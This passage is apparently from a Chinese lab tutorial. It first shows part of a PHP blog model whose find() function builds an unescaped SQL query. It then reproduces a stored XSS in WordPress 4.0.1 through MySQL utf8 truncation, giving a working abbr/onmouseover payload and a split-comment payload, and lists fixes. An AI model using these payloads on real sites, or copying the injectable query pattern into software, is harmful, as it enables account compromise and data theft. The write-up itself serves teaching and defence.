    if (!preg_match('/^[0-9]+$/', $this->id)) {
      die("ERROR: INTEGER REQUIRED");
    }
    $comments = Array();
    $result = mysql_query("SELECT count(*) as count FROM comments where post_id=".$this->id);
    $row = mysql_fetch_assoc($result);
    return $row['count'];
  } 
 
  function get_comments() {
    if (!preg_match('/^[0-9]+$/', $this->id)) {
      die("ERROR: INTEGER REQUIRED");
    }
    $comments = Array();
    $results = mysql_query("SELECT * FROM comments where post_id=".$this->id);
    if (isset($results)){
      while ($row = mysql_fetch_assoc($results)) {
        $comments[] = Comment::from_row($row);
      }
    }
    return $comments;
  } 
 
  function find($id) {
    $result = mysql_query("SELECT * FROM posts where id=".$id);
    $row = mysql_fetch_assoc($result); 
    if (isset($row)){
      $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
    }
    return $post;
  
  }
  function delete($id) {
    if (!preg_match('/^[0-9]+$/', $id)) {
      die("ERROR: INTEGER REQUIRED");
    }
    $result = mysql_query("DELETE FROM posts where id=".(int)$id);
  }
  
  function update($title, $text) {
      $sql = "UPDATE posts SET title='";
      $sql .= mysql_real_escape_string(htmlspecialchars($_POST["title"]))."',text='";
      $sql .= mysql_real_escape_string(htmlspecialchars( $_POST["text"]))."' WHERE id=";
      $sql .= intval($this->id);
      $result = mysql_query($sql);
      $this->title = $title; 
      $this->text = $text; 
  } 
 
  function create(){
      $sql = "INSERT INTO posts (title, text) VALUES ('";
      $title = mysql_real_escape_string(htmlspecialchars( $_POST["title"]));
      $text = mysql_real_escape_string(htmlspecialchars( $_POST["text"]));
      $sql .= $title."','".$text;
      $sql.= "')";
      $result = mysql_query($sql);

  }
}
?>

```
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183041654.png)
实例化成功
![在这里插入图片描述](assets/20190527140320288.png)

# 4. CMS实战演练
## 4.1 WordPress简介
WordPress于2003年开始使用一段代码来增强日常写作的印刷效果，用户数量少于您可以依靠手指和脚趾的数量。自那时起，它已成长为世界上最大的自主托管博客工具，在数百万个网站上使用，每天都有数千万人看到。
## 4.2 WordPress部署
下载4.1版本以下
```
https://cn.wordpress.org/wordpress-4.0.1-zh_CN.zip
```
使用phpstudy搭建WordPress
放到跟目录直接一把梭
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183140052.png)

## 4.3 安装
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183141779.png)
先创建一个数据库`create database wordpress;`
![在这里插入图片描述](assets/20190527141058893.png)
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183144410.png)
![在这里插入图片描述](assets/20190527141130283.png)
进行安装
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183151803.png)
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183201341.png)![](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183155787.png)
安装成功

## 4.4 WordPress漏洞介绍
漏洞出现在wordpress的留言处，不过问题是由mysql的一个特性引起的。在mysql的utf8字符集中，一个字符由1~3个字节组成，对于大于3个字节的字符，mysql使用了utf8mb4的形式来存储。如果我们将一个utf8mb4字符插入到utf8编码的列中，那么在mysql的非strict mode下，他的做法是将后面的内容截断。截断的话，就能绕过很多富文本过滤器了。比如，插入两个评论`<img src=1`，和`onerror=alert(1)//`，这二者都不会触发某些富文本过滤器（因为前者并不含有白名单外的属性，后者并不是一个标签），但两个评论如果存在于同一个页面，就会拼接成一个完整的HTML标签，触发onerror事件。


## 4.5 WordPress漏洞演示
先把Mysql的strict mode关闭
my.ini

```
将其中的 sql-mode="STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"

修改为 sql-mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
```
攻击代码//P神博客的
```
<abbr title="qweqw style=display:block;position:fixed;width:100%;height:100%;top:0; onmouseover=alert(1)// 𝌆">
```

![在这里插入图片描述](assets/2019052715060624.png)
![在这里插入图片描述](assets/20190527151148152.png)

## 4.6  WordPress漏洞修复

对于这种漏洞，极端的方法就是，禁止任何标签，用实体化函数把输入的全部实体化。或者更新系统。影响范围较广。
### 4.6.1 禁止任何标签
删除wp-includes/ksec.php中$allowedposttags下的全部标签。

### 4.6.2 更新cms系统
更新至最新版本。
### 4.6.3 Mysql开启strict mode
开启严格模式，自动过滤掉导致mysql误以为是utf8mb4编码的字符。


